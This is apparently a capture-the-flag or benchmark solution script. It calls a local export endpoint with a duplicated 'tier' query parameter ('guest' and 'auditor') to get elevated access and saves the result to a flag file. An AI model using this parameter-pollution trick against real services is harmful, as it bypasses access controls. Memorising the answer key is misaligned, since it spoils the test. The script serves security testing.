#!/bin/bash
set -euo pipefail
python3 - <<'PY'
import urllib.request
url='http://127.0.0.1:9139/v1/export?tier=guest&tier=auditor'
open('/app/flag.txt','wb').write(urllib.request.urlopen(url,timeout=2).read())
PY
